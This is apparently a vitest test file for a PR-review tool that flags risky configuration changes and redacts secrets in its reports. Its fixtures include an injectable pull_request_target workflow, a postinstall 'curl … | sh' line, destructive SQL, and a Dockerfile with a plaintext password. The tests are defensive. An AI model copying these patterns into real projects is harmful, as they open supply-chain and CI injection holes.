/** 自动检查回归：真实危险/安全配置、变更行范围和秘密脱敏。 */
import { describe, expect, it } from "vitest";
import {
  discoverReviewChecks,
  redactCheckEvidence,
  runReviewChecks,
} from "./checks.js";
import { parseUnifiedDiff } from "./diff.js";
import { assessReviewWithChecks } from "./assessment.js";
import { renderDiffForModel } from "./context.js";
import { renderReviewReport } from "./report.js";
import type { PrReviewContract } from "./types.js";

function changedFile(path: string, content: string) {
  const lines = content.split("\n");
  return parseUnifiedDiff(
    `diff --git a/${path} b/${path}\n--- /dev/null\n+++ b/${path}\n@@ -0,0 +1,${lines.length} @@\n${lines.map((line) => `+${line}`).join("\n")}\n`,
  );
}
async function checkFile(path: string, content: string, checkId: string) {
  return runReviewChecks(changedFile(path, content), {
    sources: [{ path, content }],
    enabled: [checkId],
  });
}

const unsafeWorkflow = `on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}
      - run: |
          echo "\${{ github.event.pull_request.title }}"
`;

describe("configuration check discovery", () => {
  it("discovers checks by filename without a registry", async () => {
    expect([...(await discoverReviewChecks()).keys()]).toEqual([
      "access",
      "actions",
      "docker",
      "migration",
      "package",
      "secrets",
    ]);
  });

  it("rejects unknown check names rather than silently skipping them", async () => {
    await expect(
      runReviewChecks(changedFile("x.ts", "x"), { enabled: ["missing"] }),
    ).rejects.toThrow("没有安装");
  });

  it("only runs a check on file kinds it understands", async () => {
    const result = await checkFile("src/main.ts", unsafeWorkflow, "actions");
    expect(result.observations).toEqual([]);
    expect(result.executed[0]?.files).toBe(0);
  });
});

describe("GitHub Actions checks", () => {
  it("reports untrusted checkout and direct shell interpolation with exact lines", async () => {
    const result = await checkFile(
      ".github/workflows/build.yml",
      unsafeWorkflow,
      "actions",
    );
    expect(result.observations).toHaveLength(2);
    expect(result.observations[0]).toMatchObject({
      category: "workflow",
      nature: "configuration_fact",
      line: 7,
    });
    expect(result.observations[1]?.line).toBe(11);
    expect(result.observations[1]?.evidence).toContain(
      "github.event.pull_request.title",
    );
  });

  it("does not report a trusted checkout or env-mediated shell input", async () => {
    const safe = `on: pull_request\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: echo "$PR_TITLE"\n        env:\n          PR_TITLE: \${{ github.event.pull_request.title }}\n`;
    expect(
      (await checkFile(".github/workflows/test.yml", safe, "actions"))
        .observations,
    ).toEqual([]);
  });

  it("does not report a historical unsafe run line absent from the current additions", async () => {
    const content = unsafeWorkflow + "# new comment\n";
    const diff = parseUnifiedDiff(
      `diff --git a/.github/workflows/build.yml b/.github/workflows/build.yml\n--- a/.github/workflows/build.yml\n+++ b/.github/workflows/build.yml\n@@ -12,0 +13 @@\n+# new comment\n`,
    );
    const result = await runReviewChecks(diff, {
      sources: [{ path: ".github/workflows/build.yml", content }],
      enabled: ["actions"],
    });
    expect(result.observations).toEqual([]);
  });

  it("detects a newly introduced high privilege trigger around an existing checkout", async () => {
    const diff = parseUnifiedDiff(
      `diff --git a/.github/workflows/build.yml b/.github/workflows/build.yml\n--- a/.github/workflows/build.yml\n+++ b/.github/workflows/build.yml\n@@ -2 +2 @@\n-  pull_request:\n+  pull_request_target:\n`,
    );
    const result = await runReviewChecks(diff, {
      sources: [
        { path: ".github/workflows/build.yml", content: unsafeWorkflow },
      ],
      enabled: ["actions"],
    });
    expect(result.observations).toHaveLength(1);
    expect(result.observations[0]?.line).toBe(2);
  });
});

describe("container checks", () => {
  it("finds remote ADD without checksum, literal credentials and private-key copy", async () => {
    const result = await checkFile(
      "Dockerfile",
      "FROM node:22\nENV APP_PASSWORD=supersecret\nADD https://example.com/app.tar.gz /app\nCOPY id_rsa /root/.ssh/id_rsa\n",
      "docker",
    );
    expect(result.observations).toHaveLength(3);
    expect(JSON.stringify(result)).not.toContain("supersecret");
    expect(result.observations[0]?.evidence).toContain("[REDACTED]");
  });

  it("accepts checksum-pinned ADD, a secret mount and no-default ARG", async () => {
    const content =
      "FROM node:22\nARG API_TOKEN\nADD --checksum=sha256:123 https://example.com/app.tar.gz /app\nRUN --mount=type=secret,id=token read-token\n";
    expect(
      (await checkFile("Dockerfile", content, "docker")).observations,
    ).toEqual([]);
  });

  it("redacts legacy ENV space-separated values too", async () => {
    const result = await checkFile(
      "Dockerfile",
      "ENV PASSWORD supersecret\n",
      "docker",
    );
    expect(result.observations).toHaveLength(1);
    expect(JSON.stringify(result)).not.toContain("supersecret");
  });
});

describe("package and migration checks", () => {
  it("finds lifecycle download execution and floating dependencies in real package JSON", async () => {
    const content = JSON.stringify(
      {
        scripts: { postinstall: "curl https://example.com/install | sh" },
        dependencies: { foo: "latest" },
      },
      null,
      2,
    );
    const result = await checkFile("package.json", content, "package");
    expect(result.observations).toHaveLength(2);
    expect(
      result.observations.some((item) => item.title.includes("下载内容")),
    ).toBe(true);
  });

  it("does not interpret a normal test script or pinned dependency as an install script", async () => {
    const content = JSON.stringify(
      { scripts: { test: "vitest run" }, dependencies: { foo: "1.2.3" } },
      null,
      2,
    );
    expect(
      (await checkFile("package.json", content, "package")).observations,
    ).toEqual([]);
  });

  it("does not guess JSON field membership from an incomplete diff", async () => {
    const result = await runReviewChecks(
      changedFile("package.json", '"postinstall": "curl x | sh"'),
      { enabled: ["package"] },
    );
    expect(result.observations).toEqual([]);
    expect(result.filesFromDiffOnly).toBe(1);
  });

  it("reports destructive SQL and unbounded writes as review requirements", async () => {
    const result = await checkFile(
      "migrations/001.sql",
      "DROP TABLE accounts;\nALTER TABLE users ADD token TEXT NOT NULL;\nDELETE FROM sessions;\n",
      "migration",
    );
    expect(result.observations).toHaveLength(3);
    expect(result.observations.every((item) => item.level === "warning")).toBe(
      true,
    );
  });

  it("ignores SQL comments and bounded updates", async () => {
    const result = await checkFile(
      "migrations/002.sql",
      "-- DROP TABLE accounts;\n/* DELETE FROM users; */\nUPDATE users SET active = true WHERE id = 1;\n",
      "migration",
    );
    expect(result.observations).toEqual([]);
  });
});

describe("secret handling", () => {
  const token = "ghp_" + "A".repeat(36);

  it("keeps token-shaped values out of all emitted observations", async () => {
    const result = await checkFile(
      "src/config.ts",
      `const token = '${token}';`,
      "secrets",
    );
    expect(result.observations).toHaveLength(1);
    expect(JSON.stringify(result)).not.toContain(token);
    expect(result.observations[0]?.evidenceRedacted).toBe(true);
    expect(result.observations[0]?.nature).toBe("heuristic");
  });

  it("redacts JSON credentials, Docker values and authenticated URLs", () => {
    expect(redactCheckEvidence('{"api_key": "privatevalue"}')).not.toContain(
      "privatevalue",
    );
    expect(redactCheckEvidence("ENV APP_PASSWORD privatevalue")).not.toContain(
      "privatevalue",
    );
    expect(
      redactCheckEvidence("https://user:privatevalue@example.com"),
    ).not.toContain("privatevalue");
  });

  it("does not flag normal nonsecret string values", async () => {
    expect(
      (
        await checkFile(
          "src/app.ts",
          "const message = 'hello world';",
          "secrets",
        )
      ).observations,
    ).toEqual([]);
  });

  it("remains redacted in assessment JSON, Markdown and SARIF", async () => {
    const path = "src/config.ts";
    const content = `export const token = '${token}';`;
    const diff = changedFile(path, content);
    const context = {
      ...renderDiffForModel(diff),
      preloadedFiles: [{ path, content }],
    };
    const review: PrReviewContract = {
      contractVersion: "pr-review/v1",
      summary: "review",
      changedFileCount: 1,
      additions: 1,
      deletions: 0,
      overallTone: "approve",
      findings: [],
    };
    const assessment = await assessReviewWithChecks(review, context);
    expect(assessment.checks.status).toBe("completed");
    expect(assessment.gate.status).toBe("passed");
    for (const format of ["json", "markdown", "sarif"]) {
      const report = await renderReviewReport(format, {
        assessment,
        repository: "owner/repo",
        revision: "abc",
      });
      expect(report.content).not.toContain(token);
      expect(report.content).toContain("REDACTED");
      if (format === "sarif") {
        const parsed = JSON.parse(report.content);
        expect(parsed.runs[0].results[0]).toMatchObject({
          kind: "review",
          properties: { validatedVulnerability: false },
        });
      }
    }
  });
});

it("keeps finding fingerprints stable when report evidence needs redaction", async () => {
  const { assessReview } = await import("./assessment.js");
  const { createReviewBaseline, findingFingerprint } =
    await import("./baseline.js");
  const path = "src/config.ts";
  const token = "ghp_" + "B".repeat(36);
  const content = `export const token = '${token}';`;
  const review: PrReviewContract = {
    contractVersion: "pr-review/v1",
    summary: "检查秘密",
    changedFileCount: 1,
    additions: 1,
    deletions: 0,
    overallTone: "comment",
    findings: [
      {
        rule: "credential",
        file: path,
        afterLine: 1,
        evidence: content,
        severity: "high",
        confidence: 0.9,
        message: "疑似凭据",
        impact: "凭据可能暴露",
        suggestion: "确认并轮换",
      },
    ],
  };
  const context = renderDiffForModel(changedFile(path, content));
  const baseline = createReviewBaseline(review, { revision: "before" });
  const assessment = assessReview(review, context, { baseline });
  const report = JSON.parse(
    (
      await renderReviewReport("json", {
        assessment,
        repository: "o/r",
        revision: "abc",
      })
    ).content,
  );
  expect(report.findings[0].state).toBe("existing");
  expect(report.findings[0].fingerprint).toBe(
    findingFingerprint(review.findings[0]!),
  );
  expect(JSON.stringify(report)).not.toContain(token);
});
